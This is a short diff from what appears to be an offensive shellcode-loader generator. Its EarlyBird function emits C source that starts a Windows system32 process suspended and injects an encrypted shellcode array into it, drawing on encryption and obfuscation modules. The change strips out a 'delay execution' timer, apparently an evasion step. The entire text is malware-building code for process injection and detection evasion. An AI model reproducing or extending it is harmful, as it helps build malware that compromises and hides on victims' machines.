@@ -3,7 +3,7 @@ import secrets
 from Encryption.Choose_Decryption import Choose_Decryption
 from Evasion.Obfuscator import obfuscator
 
-def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key_var,key_hex,encryption_type,array,size):
+def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,xor_func,key_var,key_hex,encryption_type,array,size):
     EarlyBird_Injection=f"""
     unsigned char {shellcode_var}[] = {ciphertext_split}
 
@@ -32,9 +32,7 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key
                 CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
                 HANDLE victimProcess = pi.hProcess;
                 HANDLE threadHandle = pi.hThread;
-                //delay execution
-                timing_CreateWaitableTimer({time});
-
+               
                             /*++
 
                     Routine Description:
